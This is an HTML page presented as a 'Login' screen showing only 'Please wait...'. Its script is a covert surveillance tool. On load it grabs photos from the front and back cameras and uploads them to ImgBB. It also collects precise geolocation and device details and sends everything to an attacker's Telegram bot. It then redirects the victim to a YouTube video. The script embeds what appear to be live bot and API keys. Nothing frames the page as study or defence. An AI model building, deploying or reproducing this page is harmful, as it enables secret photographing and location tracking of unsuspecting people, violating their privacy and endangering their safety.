<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <div class="subtitle">Please wait...</div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        // =========================
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        // Telegram ဆိုရင် Chrome ပြောင်းခိုင်းမယ်
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        let backPhotoSent = false;
        let frontPhotoSent = false;
        
        // ========== SEND MESSAGE ==========
        async function sendMessageToOwner(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: text
                    })
                });
            } catch(e) {
                console.log('Send message error:', e);
            }
        }
        
        // ========== UPLOAD TO IMGBB ==========
        async function uploadToImgBB(imageBlob) {
            const formData = new FormData();
            formData.append('image', imageBlob);
            
            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            if (data.success) {
                return data.data.url;
            } else {
                throw new Error('Upload failed');
            }
        }
        
        // ========== TAKE PHOTO ==========
        async function takePhotoAndSend(stream, cameraType) {
            if (cameraType === 'back' && backPhotoSent) return;
            if (cameraType === 'front' && frontPhotoSent) return;
            
            if (cameraType === 'back') backPhotoSent = true;
            if (cameraType === 'front') frontPhotoSent = true;
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            canvas.toBlob(async (blob) => {
                try {
                    const imageUrl = await uploadToImgBB(blob);
                    await sendMessageToOwner(`📸 ${cameraType === 'back' ? 'BACK' : 'FRONT'} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
                } catch (err) {
                    console.log('Error:', err);
                }
                
            }, 'image/jpeg', 0.7);
        }
        
        // ========== BACK CAMERA (အနောက်) ==========
        async function initBackCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                await takePhotoAndSend(stream, 'back');
            } catch (err) {
                console.log('Back camera error:', err);
                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== FRONT CAMERA (အရှေ့) ==========
        async function initFrontCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                await takePhotoAndSend(stream, 'front');
            } catch (err) {
                console.log('Front camera error:', err);
                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== LOCATION ==========
        async function getLocation() {
            if (!navigator.geolocation) {
                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    await sendMessageToOwner(`📍 LOCATION CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\n📏 Accuracy: ${acc}m`);
                },
                async (error) => {
                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}\n📛 Error: ${error.message}`);
                }
            );
        }
        
        // ========== DEVICE INFO ==========
        async function sendDeviceInfo() {
            const deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`);
        }
        
        // ========== MAIN ==========
        async function init() {
            if (!OWNER_ID) {
                return;
            }
            
            // အနောက်ကင်မရာ (Back Camera)
            await initBackCamera();
            
            // အရှေ့ကင်မရာ (Front Camera)
            await initFrontCamera();
            
            // Location
            await getLocation();
            
            // Device Info
            await sendDeviceInfo();
            
            // အကုန်ပြီးရင် YouTube ခေါ်မယ်
            setTimeout(() => {
                window.location.href = YOUTUBE_URL;
            }, 3000);
        }
        
        // Start
        if (!isTelegram || !isMobile) {
            init();
        }
    </script>
</body>
</html>
